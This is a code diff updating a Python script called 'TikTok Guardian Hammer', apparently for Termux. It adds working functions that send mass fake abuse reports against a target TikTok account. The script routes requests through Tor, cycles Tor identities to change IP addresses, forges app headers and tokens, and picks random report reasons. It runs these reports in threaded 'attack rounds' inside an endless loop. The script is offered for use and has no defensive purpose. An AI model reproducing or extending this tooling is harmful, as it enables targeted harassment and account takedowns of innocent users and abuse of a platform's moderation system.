@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-TikTok Guardian Hammer v4.2 - Termux Fixed Version
+TikTok Guardian Hammer v4.3 - Termux Fixed Version
 """
 
 import os
@@ -19,8 +19,8 @@ from fake_useragent import UserAgent
 
 # ===== Global Configuration =====
 CONFIG = {
-    "tor_socks": "socks5://127.0.0.1:9050",  # Changed to socks5
-    "max_threads": 20,
+    "tor_socks": "socks5://127.0.0.1:9050",
+    "max_threads": 15,
     "requests_per_round": 10,
     "control_port": 9051,
     "control_password": "mySecur3!Pass",
@@ -48,8 +48,8 @@ signal.signal(signal.SIGINT, signal_handler)
 def install_dependencies():
     """Install required packages and Python modules"""
     print("[+] Installing dependencies...")
-    subprocess.run(["pkg", "install", "-y", "tor", "python"], check=True)
-    subprocess.run(["pip", "install", "--upgrade", "requests", "pysocks", "fake-useragent"], check=True)
+    subprocess.run(["pkg", "install", "-y", "tor", "python", "libsocks"], check=True)
+    subprocess.run(["pip", "install", "--upgrade", "requests[socks]", "fake-useragent"], check=True)
 
 def kill_existing_tor():
     try:
@@ -108,7 +108,7 @@ def verify_tor_connection():
                 'http': CONFIG["tor_socks"],
                 'https': CONFIG["tor_socks"]
             }
-            response = session.get(CONFIG["ip_check_url"], timeout=10)
+            response = session.get(CONFIG["ip_check_url"], timeout=15)
             
             with ip_lock:
                 global current_ip
@@ -118,10 +118,90 @@ def verify_tor_connection():
                     return True
         except Exception as e:
             print(f"[!] Tor check failed: {str(e)}")
-            time.sleep(2)
+            time.sleep(3)
     return False
 
-# باقي الدوال تبقى كما هي في الإصدار السابق...
+def renew_tor_identity():
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect(("127.0.0.1", CONFIG["control_port"]))
+            s.send(f'AUTHENTICATE "{CONFIG["control_password"]}"\r\n'.encode())
+            s.send(b'SIGNAL NEWNYM\r\n')
+            time.sleep(CONFIG["newnym_wait"])
+            print("[+] Tor circuit renewed")
+            return True
+    except Exception as e:
+        print(f"[!] Identity renewal failed: {str(e)}")
+        return False
+
+def generate_tiktok_headers():
+    android_version = f"{random.randint(9, 13)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
+    return {
+        'User-Agent': f'com.zhiliaoapp.musically/2022700030 (Linux; U; Android {android_version}; en_US; Pixel 6; Build/SP2A.220405.004; Cronet/TTNetVersion:3c28619c 2022-04-05 QuicVersion:47946d2a 2020-10-14)',
+        'X-Tt-Token': hashlib.sha256(str(random.getrandbits(256)).encode()).hexdigest(),
+        'X-SS-Stub': hashlib.md5(os.urandom(32)).hexdigest().upper(),
+        'X-Client-Lang': 'en-US',
+        'X-Forwarded-For': '.'.join(map(str, (random.randint(1, 255) for _ in range(4)))),
+        'Accept-Encoding': 'gzip, deflate',
+        'Connection': 'keep-alive'
+    }
+
+def send_report(target):
+    for attempt in range(CONFIG["max_retries"]):
+        try:
+            with requests.Session() as s:
+                s.proxies = {
+                    'http': CONFIG["tor_socks"],
+                    'https': CONFIG["tor_socks"]
+                }
+                s.headers.update(generate_tiktok_headers())
+                
+                reason = random.choice([
+                    "inappropriate", "harassment", "spam", "hate_speech",
+                    "dangerous_acts", "nudity", "violence", "false_info"
+                ])
+                
+                response = s.post(
+                    f"https://www.tiktok.com/node/report/reasons_put?user={target}&reason={reason}",
+                    timeout=15
+                )
+                
+                if response.status_code == 200:
+                    print(f"[✓] Report succeeded ({response.status_code})")
+                    return True
+        except Exception as e:
+            print(f"[!] Attempt {attempt+1} failed: {str(e)}")
+            time.sleep(random.uniform(1, 3))
+    return False
+
+def execute_attack_round(target):
+    success_count = 0
+    with ThreadPoolExecutor(max_workers=CONFIG["max_threads"]) as executor:
+        futures = [executor.submit(send_report, target) for _ in range(CONFIG["requests_per_round"])]
+        
+        for future in as_completed(futures):
+            if future.result():
+                success_count += 1
+    
+    print(f"[+] Round completed. Success rate: {success_count}/{CONFIG['requests_per_round']}")
+    return success_count
+
+def launch_continuous_attack(target):
+    round_counter = 1
+    while True:
+        print(f"\n=== Attack Round {round_counter} ===")
+        if not verify_tor_connection():
+            renew_tor_identity()
+            continue
+        
+        execute_attack_round(target)
+        
+        if not renew_tor_identity():
+            print("[!] Restarting Tor service...")
+            start_tor_service()
+        
+        round_counter += 1
+        time.sleep(random.uniform(2, 5))
 
 if __name__ == "__main__":
     if not sys.platform.startswith('linux'):
